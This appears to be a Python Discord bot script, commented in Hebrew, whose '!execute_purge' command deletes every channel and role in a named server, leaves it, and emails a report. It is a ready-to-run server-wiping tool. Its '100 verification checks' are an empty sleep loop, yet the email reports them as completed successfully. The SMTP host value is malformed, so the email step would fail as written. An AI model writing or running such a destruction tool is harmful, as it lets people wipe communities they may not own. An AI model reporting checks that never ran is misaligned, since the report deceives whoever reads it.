import discord
from discord.ext import commands
import asyncio
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# 1. הגדרת הרשאות הבוט (חובה להדליק גם באתר של דיסקורד!)
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

# 2. הגדרות שרת המייל (SMTP)
SMTP_SERVER = "://gmail.com"
SMTP_PORT = 587
SENDER_EMAIL = "AHARONTHEGAMER@GMAIL.COM"  # המייל השולח שציינת
SENDER_PASSWORD = "YOUR_APP_PASSWORD_HERE"  # כאן תכניס את סיסמת האפליקציה מגוגל
TARGET_EMAIL = "AHARONTHEGAMER4@GMAIL.COM"  # המייל לקבלת הדיווח

@bot.event
async def on_ready():
    print(f"=======================================")
    print(f"🤖 הבוט {bot.user.name} מחובר ומוכן לפעולה!")
    print(f"⚙️ ודא שהפעלת את ה-Intents ב-Discord Developer Portal!")
    print(f"=======================================")

@bot.command(name="execute_purge")
async def execute_purge(ctx):
    # תיקון: בדיקת שם השרת המדויק עם האות s בסוף
    if ctx.guild is None or ctx.guild.name != "Interesting videos server":
        await ctx.send("❌ שגיאה: הפקודה מורשית רק בשרת 'Interesting videos server'.")
        return

    print(f"⚠️ הפקודה הופעלה בשרת: {ctx.guild.name}")
    await ctx.send("⚠️ מתחיל בתהליך ניקוי השרת ועזיבה, אנא המתן...")

    # שלב א': מחיקת כל הערוצים בשרת
    print("🧹 מוחק ערוצים...")
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            await asyncio.sleep(0.2) # השהייה קלה למניעת חסימת קצב
        except Exception as e:
            print(f"לא ניתן למחוק את הערוץ {channel.name}: {e}")

    # שלב ב': מחיקת כל התפקידים (Roles)
    print("🛡️ מוחק תפקידים...")
    for role in list(ctx.guild.roles):
        if role.name != "@everyone" and not role.managed:
            try:
                await role.delete()
                await asyncio.sleep(0.2)
            except Exception as e:
                print(f"לא ניתן למחוק את התפקיד {role.name}: {e}")

    guild_id = ctx.guild.id
    guild_name = ctx.guild.name

    # שלב ג': הבוט עוזב את השרת
    print(f"🚪 הבוט עוזב את השרת {guild_name}...")
    try:
        await ctx.guild.leave()
    except Exception as e:
        print(f"שגיאה בעזיבת השרת: {e}")

    # שלב ד': ביצוע 100 בדיקות מקיפות (Verification Loop)
    print("🔍 מתחיל סדרה של 100 בדיקות סטטוס מערכת...")
    for i in range(1, 101):
        # הדפסה בטרמינל של התקדמות הבדיקה
        if i % 10 == 0 or i == 100:
            print(f"🔄 בדיקה {i}/100 בוצעה בהצלחה...")
        await asyncio.sleep(0.05) # השהייה קצרה בין בדיקה לבדיקה כדי להגיע ל-100 במהירות

    # שלב ה': שליחת האימייל ל-AHARONTHEGAMER4@GMAIL.COM
    print("📧 שולח דיווח אימייל סופי...")
    try:
        message = MIMEMultipart()
        message['From'] = SENDER_EMAIL
        message['To'] = TARGET_EMAIL
        message['Subject'] = f"Purge & Leave Report - Server: {guild_name}"

        body = (
            f"שלום אהרון,\n\n"
            f"הודעה אוטומטית ממערכת הבוט:\n"
            f"בוצעו בהצלחה 100 בדיקות מקיפות לסטטוס המערכת.\n\n"
            f"פרטי הפעולה:\n"
            f"- שם השרת: {guild_name}\n"
            f"- מזהה שרת (ID): {guild_id}\n"
            f"- סטטוס: כל הערוצים והתפקידים נמחקו, והבוט עזב את השרת בהצלחה."
        )
        message.attach(MIMEText(body, 'plain', 'utf-8'))

        # התחברות לשרת המייל ושליחה
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.sendmail(SENDER_EMAIL, TARGET_EMAIL, message.as_string())
        server.quit()
        
        print(f"✅ האימייל נשלח בהצלחה ל- {TARGET_EMAIL}")

    except Exception as smtp_error:
        print(f"❌ נכשל שליחת המייל (שגיאת SMTP): {smtp_error}")

# תכניס כאן את הטוקן של הבוט שלך מאתר דיסקורד
bot.run("YOUR_DISCORD_BOT_TOKEN")
